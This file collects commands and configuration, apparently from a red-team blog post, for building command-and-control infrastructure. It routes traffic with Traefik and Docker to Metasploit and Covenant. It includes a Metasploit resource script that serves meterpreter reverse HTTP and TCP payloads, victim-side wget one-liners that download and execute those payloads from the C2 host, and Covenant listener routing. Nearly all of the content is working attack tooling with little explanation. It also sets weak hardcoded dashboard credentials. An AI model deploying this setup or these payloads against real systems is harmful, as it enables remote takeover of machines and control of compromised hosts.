@@ -1,0 +1,183 @@
+## SOURCE:::
+## https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/
+
+
+$ mkdir edgy-c2
+$ cd edgy-c2/
+$ echo "C2EXTIP=YOUR-C2-EXT-IP" > .env
+
+
+$ sudo -s # If not running as root
+$ curl -L "https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+$ chmod +x /usr/local/bin/docker-compose
+$ docker-compose --version # Check that it is installed correctly. Might need to reload shell
+
+## change this:
+#  vim docker-compose.yml
+version: "3.7"
+
+services:
+
+  traefik:
+    image: "traefik:v2.1"
+    container_name: "traefik"
+    command:
+      - "--log.level=DEBUG"
+      - "--api.dashboard=true"
+      - "--accesslog=true"
+      - "--providers.docker=true"
+      - "--providers.docker.exposedbydefault=false"
+      - "--entrypoints.web-ep.address=:80"
+      - "--entrypoints.tls-ep.address=:443"
+      - "--entrypoints.tcp-ep.address=:8888"
+    labels:
+      - "traefik.enable=true"
+      - "traefik.http.routers.api.rule=PathPrefix(`/dashboard`) || PathPrefix(`/api`)"
+      - "traefik.http.routers.api.service=api@internal"
+      - "traefik.http.routers.api.middlewares=auth"
+      # test:test
+      - "traefik.http.middlewares.auth.basicauth.users=test:$$apr1$$241s8k7o$$W8AhFxO9ctEtjWHbXKsKp0"
+     
+      
+    ports:
+      - "80:80"
+      - "443:443"
+      - "8888:8888"
+    volumes:
+      - "/var/run/docker.sock:/var/run/docker.sock:ro"
+
+
+##############
+$ echo -e '#!/bin/bash\nsleep 1d' > sleep.sh ; chmod +x sleep.sh
+
+#############
+## change this:
+# vim double_delivery.rc
+use exploit/multi/script/web_delivery
+set LHOST YOUR-C2-EXT-IP
+show targets
+set target 6
+set payload linux/x64/meterpreter_reverse_http
+set URIPATH delivery_http
+set LURI handler
+set LPORT 80
+set ReverseListenerBindPort 4444
+set SRVPORT 8080
+run
+
+set payload linux/x64/meterpreter_reverse_tcp
+set URIPATH delivery_tcp
+set LPORT 8888
+set ReverseListenerBindPort 4445
+set SRVPORT 8081
+run
+
+
+
+#############
+## change this:
+# vim docker-compose.yml
+
+
+
+# ** snip ** 
+# Traefik declaration block above
+# Note that the msf block is indented
+
+  msf:
+    image: "metasploitframework/metasploit-framework"
+    container_name: "msf"
+    volumes:
+        - ./sleep.sh:/sleep.sh
+        - ./double_delivery.rc:/usr/src/metasploit-framework/double_delivery.rc
+    command: /sleep.sh
+    labels:
+      - "traefik.enable=true"
+      # HTTP Payload Delivery - host/delivery_http to msf:8080
+      - "traefik.http.routers.msfDelivery.rule=Host(`$C2EXTIP`) && PathPrefix(`/delivery_http`)"
+      - "traefik.http.routers.msfDelivery.service=msfDelivery@docker"
+      - "traefik.http.routers.msfDelivery.entrypoints=web-ep"
+      - "traefik.http.services.msfDelivery.loadbalancer.server.port=8080"
+      # TCP Payload Delivery - host/delivery_tcp to msf:8081
+      - "traefik.http.routers.msfDeliveryTcp.rule=Host(`$C2EXTIP`) && PathPrefix(`/delivery_tcp`)"
+      - "traefik.http.routers.msfDeliveryTcp.service=msfDeliveryTcp@docker"
+      - "traefik.http.routers.msfDeliveryTcp.entrypoints=web-ep"
+      - "traefik.http.services.msfDeliveryTcp.loadbalancer.server.port=8081"
+      # HTTP Payload Handler host/handler to msf:4444
+      - "traefik.http.routers.msfHandler.rule=Host(`$C2EXTIP`) && PathPrefix(`/handler`)"
+      - "traefik.http.routers.msfHandler.service=msfHandler@docker"
+      - "traefik.http.routers.msfHandler.entrypoints=web-ep"
+      - "traefik.http.services.msfHandler.loadbalancer.server.port=4444"
+      # TCP Payload Handler host:8888 to msf:4445
+      - "traefik.tcp.routers.msfHandlerTcp.rule=HostSNI(`*`)"
+      - "traefik.tcp.routers.msfHandlerTcp.service=msfHandlerTcp@docker"
+      - "traefik.tcp.services.msfHandlerTcp.loadbalancer.server.port=4445"
+      - "traefik.tcp.routers.msfHandlerTcp.entrypoints=tcp-ep"
+
+
+######################
+
+docker-compose up
+
+######################
+$ docker exec -it msf /bin/bash
+bash-5.0> ./msfconsole -r double_delivery.rc
+
+######################
+
+$  wget -qO httpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_http; chmod +x httpPayload; ./httpPayload&
+$  wget -qO tcpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_tcp; chmod +x tcpPayload; ./tcpPayload&
+
+######################
+
+$ git clone --recurse-submodules https://github.com/cobbr/Covenant
+$ docker build -t covenant Covenant/Covenant # Give it a few minutes
+
+######################
+## change this:
+# vim covenant-docker-compose.yml
+
+version: "3.7"
+
+services:
+
+  covenant:
+    image: "covenant"
+    container_name: "covenant"
+    labels:
+      - "traefik.enable=true"
+      # Web interface - host:443 to covenant:7443
+      - "traefik.tcp.routers.covenantUi.rule=HostSNI(`*`)"
+      - "traefik.tcp.routers.covenantUi.service=covenantUi@docker"
+      - "traefik.tcp.services.covenantUi.loadbalancer.server.port=7443"
+      - "traefik.tcp.routers.covenantUi.entrypoints=tls-ep"
+      # HTTP Delivery - host/cov_delivery to covenant:80
+      - "traefik.http.routers.covenantDelivery.rule=Host(`$C2EXTIP`) && PathPrefix(`/cov_delivery`)"
+      - "traefik.http.routers.covenantDelivery.service=covenantDelivery@docker"
+      - "traefik.http.routers.covenantDelivery.entrypoints=web-ep"
+      - "traefik.http.services.covenantDelivery.loadbalancer.server.port=80"
+      # HTTP Payload Handler - host/cov_handler to covenant:80
+      - "traefik.http.routers.covenantHandler.rule=Host(`$C2EXTIP`) && PathPrefix(`/cov_handler`)"
+      - "traefik.http.routers.covenantHandler.service=covenantHandler@docker"
+      - "traefik.http.routers.covenantHandler.entrypoints=web-ep"
+      - "traefik.http.services.covenantHandler.loadbalancer.server.port=80"
+networks:
+  default:
+    external:
+      name: edgy-c2_default
+
+
+######################
+$ docker-compose -f covenant-docker-compose.yml up
+
+
+######################
+
+docker-compose -f covenant-docker-compose.yml down
+
+######################
+######################
+######################
+######################
+
+
